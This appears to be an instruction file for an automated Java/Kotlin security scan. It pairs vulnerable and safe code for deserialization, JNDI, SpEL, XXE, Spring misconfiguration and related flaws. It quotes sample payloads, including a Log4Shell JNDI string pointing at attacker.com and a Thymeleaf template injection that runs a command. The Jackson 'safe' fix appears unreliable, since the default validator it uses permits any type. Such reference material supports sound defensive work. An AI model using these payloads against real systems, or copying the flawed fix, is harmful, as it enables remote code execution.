---
name: sc-lang-java
description: Java/Kotlin-specific security deep scan
---

# SC: Java/Kotlin Security Deep Scan

## Purpose

Detects Java/Kotlin-specific security anti-patterns including deserialization gadget chains, JNDI injection (Log4Shell patterns), Spring framework vulnerabilities, XML parsing XXE, and Kotlin-specific interop risks. Covers the JVM ecosystem's unique attack surface.

## Activation

Activates when Java or Kotlin is detected in `security-report/architecture.md`.

## Checklist Reference

References `checklists/java-security-checklist.md`.

## Java/Kotlin-Specific Vulnerability Patterns

### Category 1: Java Deserialization

```java
// VULNERABLE: ObjectInputStream with untrusted data
ObjectInputStream ois = new ObjectInputStream(socketInputStream);
Object obj = ois.readObject(); // Gadget chain → RCE

// SAFE: Deserialization filter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;!*"
);
ois.setObjectInputFilter(filter);

// SAFEST: Use JSON/protobuf instead
```

### Category 2: JNDI Injection (Log4Shell Pattern)

```java
// VULNERABLE: User input reaching JNDI lookup
ctx.lookup(userInput); // userInput = "ldap://attacker.com/exploit"
// Log4j pattern: logger.info("User: " + userInput);
// If userInput = "${jndi:ldap://attacker.com/a}" → RCE

// SAFE: Disable JNDI lookups, update Log4j 2.17.1+
System.setProperty("log4j2.formatMsgNoLookups", "true");
```

### Category 3: Spring SpEL Injection

```java
// VULNERABLE: User input in SpEL expression
SpelExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);
Object result = exp.getValue(); // Code execution!

// SAFE: Use SimpleEvaluationContext (restricts available types)
EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
Object result = exp.getValue(context);
```

### Category 4: Spring Actuator Exposure

```yaml
# VULNERABLE: Actuator endpoints exposed without auth
management:
  endpoints:
    web:
      exposure:
        include: "*"  # Exposes /actuator/env, /actuator/heapdump, etc.

# SAFE: Restrict actuator endpoints
management:
  endpoints:
    web:
      exposure:
        include: health,info
```

### Category 5: Hibernate HQL Injection

```java
// VULNERABLE: String concatenation in HQL
String hql = "FROM User WHERE name = '" + name + "'";
Query query = session.createQuery(hql);

// SAFE: Named parameters
Query query = session.createQuery("FROM User WHERE name = :name");
query.setParameter("name", name);
```

### Category 6: Servlet Parameter Pollution

```java
// VULNERABLE: Using getParameter when multiple values exist
String role = request.getParameter("role");
// If URL is ?role=user&role=admin, behavior depends on container!

// SAFE: Be explicit about handling
String[] roles = request.getParameterValues("role");
```

### Category 7: Runtime.exec Command Injection

```java
// VULNERABLE: Single string to exec (uses shell on some platforms)
Runtime.getRuntime().exec("cmd /c dir " + userInput);

// SAFE: Array form
new ProcessBuilder("dir", userInput).start();
// But still risky with cmd.exe — prefer direct binary execution
```

### Category 8: XML Parsing XXE

```java
// VULNERABLE: Default DocumentBuilderFactory allows XXE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(inputStream);

// SAFE: Disable external entities
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### Category 9: Kotlin Null Safety via Java Interop

```kotlin
// VULNERABLE: Java method returns null, Kotlin assumes non-null
val name: String = javaObject.getName() // NPE if getName() returns null!
// Java's @Nullable annotations may not be enforced

// SAFE: Treat Java return values as nullable
val name: String? = javaObject.getName()
val safeName = name ?: "default"
```

### Category 10: Kotlin Coroutine Exception Handling

```kotlin
// VULNERABLE: Unhandled exception in coroutine cancels parent scope
scope.launch {
    riskyOperation() // Exception kills entire scope!
}

// SAFE: SupervisorJob or exception handler
val handler = CoroutineExceptionHandler { _, ex -> log.error("Error", ex) }
scope.launch(handler + SupervisorJob()) {
    riskyOperation()
}
```

### Category 11: Reflection Security

```java
// VULNERABLE: Reflection bypasses access control
Field field = User.class.getDeclaredField(userInput);
field.setAccessible(true); // Bypasses private!
field.set(user, newValue);

// SAFE: Never use user input in reflection operations
```

### Category 12: JDBC Connection String Injection

```java
// VULNERABLE: User input in connection string
String url = "jdbc:mysql://db:3306/" + userInput;
DriverManager.getConnection(url);
// User can inject: dbname?autoDeserialize=true&queryInterceptors=...

// SAFE: Validate database name, use connection pool config
```

### Category 13: SecureRandom vs Random

```java
// VULNERABLE: java.util.Random is predictable
Random random = new Random();
String token = Long.toHexString(random.nextLong());

// SAFE: SecureRandom for security-sensitive values
SecureRandom random = new SecureRandom();
byte[] bytes = new byte[32];
random.nextBytes(bytes);
```

### Category 14: Gradle/Maven Supply Chain

- Check for untrusted plugin repositories in build.gradle
- Review custom Gradle plugins for code execution
- Verify dependency checksums
- Check for repository substitution attacks (internal→public)

### Category 15: Thymeleaf SSTI

```java
// VULNERABLE: User input in Thymeleaf template string
String template = "Hello " + userInput;
templateEngine.process(template, context);
// userInput = "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"

// SAFE: User input as template variable
model.addAttribute("name", userInput);
templateEngine.process("hello", context); // hello.html: <span th:text="${name}">
```

### Category 16: JSP Expression Language Injection

```jsp
<!-- VULNERABLE: User input in EL expression -->
<c:out value="${param.name}" />  <!-- Generally safe with c:out -->
${param.name}  <!-- Direct EL is NOT auto-escaped in JSP! XSS -->

<!-- SAFE: Use JSTL c:out or fn:escapeXml -->
<c:out value="${param.name}" escapeXml="true" />
```

### Category 17: Spring Mass Assignment

```java
// VULNERABLE: All fields bound from request
@PostMapping("/users")
public User create(@ModelAttribute User user) {
    return repo.save(user); // role, isAdmin settable!
}

// SAFE: Use DTO
public User create(@RequestBody CreateUserDTO dto) { /* map fields */ }

// Or use @InitBinder to exclude fields
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setDisallowedFields("role", "isAdmin");
}
```

### Category 18: Spring Security Misconfiguration

```java
// VULNERABLE: CSRF disabled, all requests permitted
http.csrf().disable()
    .authorizeRequests().anyRequest().permitAll();

// SAFE: Proper security configuration
http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    .authorizeRequests()
    .antMatchers("/api/public/**").permitAll()
    .antMatchers("/api/admin/**").hasRole("ADMIN")
    .anyRequest().authenticated();
```

### Category 19: File Upload Security

```java
// VULNERABLE: No type or size validation
@PostMapping("/upload")
public void upload(@RequestParam("file") MultipartFile file) {
    file.transferTo(new File("/uploads/" + file.getOriginalFilename()));
}

// SAFE: Validate type, size, sanitize filename
if (!ALLOWED_TYPES.contains(file.getContentType())) throw new BadRequest();
String filename = UUID.randomUUID() + getExtension(file.getOriginalFilename());
```

### Category 20: Jackson Polymorphic Deserialization

```java
// VULNERABLE: DefaultTyping enables polymorphic deserialization
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // Allows arbitrary class instantiation!

// SAFE: Don't enable default typing, or use allowlist
mapper.activateDefaultTyping(
    mapper.getPolymorphicTypeValidator(),
    ObjectMapper.DefaultTyping.NON_FINAL
);
```

## Output Format

### Finding: JAVA-{NNN}
- **Title:** Java/Kotlin-specific vulnerability
- **Severity:** Critical | High | Medium | Low
- **Confidence:** 0-100
- **File:** file/path:line
- **Vulnerability Type:** CWE-XXX
- **Description:** What was found
- **Remediation:** Java-idiomatic fix
- **References:** CWE link, Spring/JVM documentation
